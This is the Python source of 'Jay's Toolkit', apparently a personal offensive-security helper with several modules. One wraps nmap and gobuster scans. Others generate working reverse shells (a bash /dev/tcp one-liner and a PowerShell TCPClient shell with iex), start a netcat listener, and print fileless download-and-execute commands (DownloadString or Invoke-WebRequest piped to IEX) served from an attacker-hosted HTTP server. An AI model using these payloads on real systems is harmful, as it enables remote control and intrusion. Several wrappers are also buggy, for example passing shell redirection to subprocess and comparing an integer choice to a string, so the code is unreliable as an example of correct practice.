#!/usr/bin/env python

import os
import sys
import argparse
import subprocess
import random
import hashlib
import string
import netifaces
import time

# RUN COMMONLY USED COMMANDS
def run_command(args):
    # RUN NMAP SCAN
    if args.command == 'nmap':
        print('[+] Running nmap scan on ' + args.target_ip)
        subprocess.run(['nmap', '-sV', '-Pn', '-p-', '-oA', args.target_ip, '--open', args.target_ip])
    # RUN GOBUSTER DIR
    elif args.command == 'gbdir':
        print('[+] Running gobuster dir on ' + args.target_url)
        subprocess.run(['gobuster', 'dir', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt', '>', args.target_url+'.gbdir'])
    # RUN GOBUSTER VHOST
    elif args.command == 'gbvhost':
        print('[+] Running gobuster vhost on ' + args.target_url)
        subprocess.run([['gobuster', 'vhost', '-u', args.target_url, '-w', '/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt', '>', args.target_url+'.gbvhost']])

# CREATE A PAYLOAD
def create_payload(args):
    print('[+] Creating payload ...')

    # GENERATE PSEUDO-RANDOM PORT
    if args.listen_port == 'random':
        random_port = random.randint(0, 49151)
        args.listen_port = str(random_port)

    # CHECK PAYLOAD OS
    if args.os == 'linux':
        print('\n[===== LINUX PAYLOAD =====]\n')
        print('bash -c \'bash -i >& /dev/tcp/' + args.listen_ip + '/' + args.listen_port + ' 0>&1\'')
        print('\n[=== END LINUX PAYLOAD ===]\n')
    elif args.os == 'windows':
        print('\n[===== WINDOWS PAYLOAD =====]\n')
        print('powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient(\'' + args.listen_ip + '\',' + args.listen_port + ');$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + \'PS \' + (pwd).Path + \'> \';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()\"')
        print('\n[=== END WINDOWS PAYLOAD ===]\n')

    # PROMPT FOR LISTENER
    print('[?] Would you like to run a listener? [y/N] ', end='')
    run_listener = input().lower()

    # START LISTENER
    if run_listener == '':
        run_listener = 'n'
    if run_listener[0] == 'y':
        try:
            # USE A RANDOM EPHEMERAL PORT
            if args.listen_port == 'random':
                subprocess.run(["nc", "-nvlp", random_port])
            # USE A DEFINED PORT
            else:
                subprocess.run(["nc", "-nvlp", args.listen_port])
        except KeyboardInterrupt:
            sys.exit(0)

# TRANSFER FILES TO
def transfer_to(args):
    # SEPARATE RELATIVE PATH TO FILE FROM FILENAME ITSELF
    relpath = args.filename
    args.filename = os.path.basename(os.path.normpath(args.filename))

    # GENERATE RANDOM FILENAME FOR EXTREMELY MINIMAL FILE OBFUSCATION
    rand_filename = ''.join(random.choices(string.ascii_letters, k=8))


    # PYTHON HTTP SERVER METHOD
    if args.method == 'http':
        print('\033[1m[?] What IP address to listen on? ', end='')
        print('\033[0m')
        try:
            listen_ip = input()
        except KeyboardInterrupt:
            sys.exit(0)
        print('\033[1m[+] Starting HTTP server on 0.0.0.0 port 443 ...\033[0m')
        try:
            pyserver = subprocess.Popen(['python', '-m', 'http.server', '-b', listen_ip, '443'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            print('\033[1m[!] Failed to start HTTP server\033[0m')
            sys.exit(1)
        
        print('[+] Run this command on target')
        if args.os == 'windows':
            print('\033[1m[+] Select method:')
            print('      1. DownloadFile')
            print('      2. DownloadString - Fileless')
            print('      3. Invoke-WebRequest')
            print('      4. Invoke-WebRequest - Fileless')
            print('[?] CHOICE: ', end='')
            print('\033[0m')
            choice = input()

            if choice == '':
                choice = '1'
                print('\033[1m[+] DownloadFile method selected\033[0m')

            if choice == '1':
                print('\033[1m[+] DownloadFile method selected\033[0m')
                print('\033[1m[?] Sync or Async? ', end='')
                print('\033[0m')
                sync = input().lower()
                if sync == '':
                    sync = 'sync'
                    print('\033[1m[+] Using synchronous DownloadFile\033[0m')
                if sync == 'async':
                    print('\033[1m[+] Using asynchronous DownloadFile\033[0m')
                    startcmd = '(New-Object Net.WebClient).DownloadFileAsync(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
                elif sync == 'sync':
                    print('[+] Using synchronous DownloadFile')
                    startcmd = '(New-Object Net.WebClient).DownloadFile(\'https://' + listen_ip + '/' + args.filename + '\',\'' + rand_filename + '\')'
                    endcmd = ''
            elif choice == '2':
                print('\033[1m[+] DownloadString - Fileless method selected\033[0m')
                choice = random.randint(1, 2)
                if choice == '1':
                    startcmd = 'IEX (New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename + '\')'
                    endcmd = ''
                else:
                    startcmd = '(New-Object Net.WebClient).DownloadString(\'https://' + listen_ip + '/' + args.filename
                    endcmd = '\') | IEX'
            elif choice == '3':
                print('\033[1m[+] Invoke-WebRequest method selected\033[0m')
                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                endcmd = ' -OutFile ' + rand_filename
            elif choice == '4':
                print('\033[1m[+] Invoke-WebRequest - Fileless method selected\033[0m')
                startcmd = 'Invoke-WebRequest https://' + listen_ip + '/' + args.filename
                endcmd = ' | IEX'
            else:
                print('[!] Invalid choice')

            command = startcmd + endcmd

            # if args.firstlaunch:
            #     command = startcmd + ' -UseBasicParsing' + endcmd
            
            print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
            # if args.trust:
            #     print('[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}')
            print(command)
            print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
        elif args.os == 'linux':
            print('\n[===== START LINUX COMMAND =====]\n')
            print('wget https://' + listen_ip + '/' + args.filename)
            print('\nOR\n')
            print('curl https://' + listen_ip + '/' + args.filename + ' -o ' + '/tmp/' + rand_filename)
            print('\n[====== END LINUX COMMAND ======]\n')

        print('[?] Close HTTP server? [Y/n] ', end='')
        time.sleep(1)
        pyterminate = input().lower()
        if pyterminate == '':
            pyterminate = 'y'
        if pyterminate == 'n':
            print('[!] HTTP server was left open')
        else:
            try:
                pyserver.terminate()
                print('[+] HTTP server succesfully terminated')
            except:
                print('[!] Could not terminate Python HTTP server')

    # BASE64 METHOD
    elif args.method == 'base64':
        print('[+] Generating Base64 string of file')
        b64_file = subprocess.run(['base64', '-w', '0', relpath], capture_output=True, text=True)
        md5h = hashlib.md5(open(relpath, 'rb').read()).hexdigest()
        print('[+] Run this command on target')

        # ON WINDOWS POWERSHELL LESS THAN 8191 CHARACTERS
        if args.os == 'windows':
            finalcmd = '[IO.File]::WriteAllBytes(\"' + '.\", [Convert]::FromBase64String(\"' + b64_file.stdout + '")); Get-FileHash ' + args.filename + ' -Algorithm md5'
            if len(finalcmd) <= 8191:
                print('\n[===== START WINDOWS POWERSHELL COMMAND =====]\n')
                print(finalcmd)
                print('\n[====== END WINDOWS POWERSHELL COMMAND ======]\n')
            else:
                print('[!] cmd.exe has a maximum string length of 8,191 characters.')
        # ON LINUX
        elif args.os == 'linux':
            print('\n[===== START LINUX COMMAND =====]\n')
            print('echo \'' + b64_file.stdout + '\' | base64 -d > ' + args.filename + ' && md5sum ' + args.filename)
            print('\n[====== END LINUX COMMAND ======]\n')


        # VERIFY MD5 HASH
        while(True):
            try:
                print('[?] Paste MD5 checksum output here to compare: ', end='')
                md5c = input()
                if md5c == md5h:
                    print('[+] MD5 checksum matches! You\'re good to go.')
                    break
                else:
                    print('[-] Uh-oh... MD5 checksum doesn\'t match. Try again.')
            except KeyboardInterrupt:
                sys.exit(0)

    # SCP METHOD
    elif args.method == 'scp':
        print('[+] Uploading ' + args.filename + ' to ' + args.target_ip + ' ...')
        scp_connect = args.ssh_user + '@' + args.target_ip + ':/tmp/' + rand_filename
        res = subprocess.run(['scp', '-P', args.target_port, args.filename, scp_connect], capture_output=True, text=True)
        if res.returncode == 0:
            print('[+] File uploaded as /tmp/' + rand_filename)
        elif res.returncode == 255:
            print('[!] File could not be uploaded. Connection refused.')

# CRACK PASSWORDS
def password_crack(args):
    print('[?] Which cracker would you like to use?')
    print('      1) Hashcat [Default]')
    print('      2) John The Ripper')
    print('CHOICE [1/2]: ', end='')
    crackprog = input().lower()

    if crackprog == '':
        crackprog = 1

    if crackprog == 2:
        print('[*] Not yet implemented')
    else:
        print('[*] Not yet implemented')

def main():
    parser = argparse.ArgumentParser(
        description='Jay\'s Toolkit',
        epilog='Use \"jref [module] -h\" for more information about a module.'
    )

    # JTK MODULES
    modules = parser.add_subparsers(
        title='Available Modules',
        dest='module'
    )

    # PASSWORD CRACKING MODULE
    crackpass = modules.add_parser('crackpass', help='Crack password hashes')
    crackpass.add_argument('filename', help='File that contains password hashes to crack')

    #############################
    ### FILE TRANSFER MODULES ###
    #############################
    transferto = modules.add_parser('transferto', help='Semi-automated file transfer to target')
    transferto.add_argument('os', help='Operating system to transfer to', choices=['windows', 'linux'])
    transferto.add_argument('method', help='Method of transferring', choices=['http', 'scp', 'base64'])
    transferto.add_argument('filename', help='File to transfer')
    transferfrom = modules.add_parser('transferfrom', help='Pastables to transfer from target')

    '''
    # FILE TRANSFER METHODS
    ftmethods = transferto.add_subparsers(filename
        title='Available Methods',
        dest='method'
    )

    # PYTHON HTTP SERVER FILE TRANSFER METHOD
    python_http = ftmethods.add_parser(
        'python_http',
        help='$(python -m http.server <listen_port>)'
    )
    python_http.add_argument('listen_ip', help='IP to start http server on')
    python_http.add_argument('filename', help='File to be transferred')
    python_http.add_argument('os', help='Target operating system', choices=['linux','windows'])
    python_http.add_argument('--trust', help='Bypass untrusted SSL/TLS certificate error', action='store_true')
    python_http.add_argument('--firstlaunch', help='Bypass first-launch configuration', action='store_true')

    # BASE64 FILE TRANSFER METHOD
    b64 = ftmethods.add_parser(
        'base64',
        help='$(base64 -w 0 <filename>)'
    )
    b64.add_argument('filename', help='File to be transferred')
    b64.add_argument('os', help='Target operating system', choices=['linux','windows'])

    scp = ftmethods.add_parser(
        'scp',
        #help='$(scp ' + args.filename + ' ' + args.sshuser + '@' + args.target_ip + ':/tmp/' + randfilename + ')'
        help='$(scp <filename> <sshuser>@<target_ip>:/tmp/random.txt -P <target_port>)'
    )
    scp.add_argument('filename', help='File to be transferred')
    scp.add_argument('ssh_user', help='SSH username')
    scp.add_argument('target_ip', help='Target to transfer file to')
    scp.add_argument('target_port', help='SSH port on target')
    '''

    # RUN MODULE FOR COMMONLY USED COMMANDS
    run_parser = modules.add_parser('run', help='Commonly used commands')
    
    # RUN COMMANDS
    commands = run_parser.add_subparsers(
        title='Available Commands',
        dest='command'
    )

    # RUN NMAP
    run_nmap = commands.add_parser(
        'nmap',
        help='$(nmap -sV -Pn -p- -oA <target_ip> --open <target_ip>)'
    )
    run_nmap.add_argument('target_ip')

    # RUN GOBUSTER DIR
    run_gbdir = commands.add_parser(
        'gbdir',
        help='$(gobuster dir -u <target_url> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt > target_url.gbdir)'
    )
    run_gbdir.add_argument('target_url')

    # RUN GOBUSTER VHOST
    run_gbvhost = commands.add_parser(
        'gbvhost',
        help='$(gobuster vhost -u <target_url> -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt > target_url.gbvhost)'
    )
    run_gbvhost.add_argument('target_url')

    ##########################################
    ### PAYLOADS MODULE TO GENERATE SHELLS ###
    ##########################################
    payloads = modules.add_parser('payloads', help='Reverse Shell, Bind Shell, and Web Shell')
    payloads.add_argument('shell', choices=['reverse','bind','web'], help='Type of shell')
    payloads.add_argument('listen_ip', help='Listening IP address')
    payloads.add_argument('listen_port', help='Listening port')
    payloads.add_argument('os', help='Target operating system', choices=['linux', 'windows'])
    payloads.add_argument('--encode', choices=['base64','hex','nospace'])

    # PARSE ALL ARGS
    args = parser.parse_args() 
    if args.module == 'run':
        run_command(args)
    elif args.module == 'payloads':
        create_payload(args)
    elif args.module == 'transferto':
        transfer_to(args)
    elif args.module == 'crackpass':
        password_crack(args)
    else:
        parser.print_help()

if __name__ == '__main__':
    main()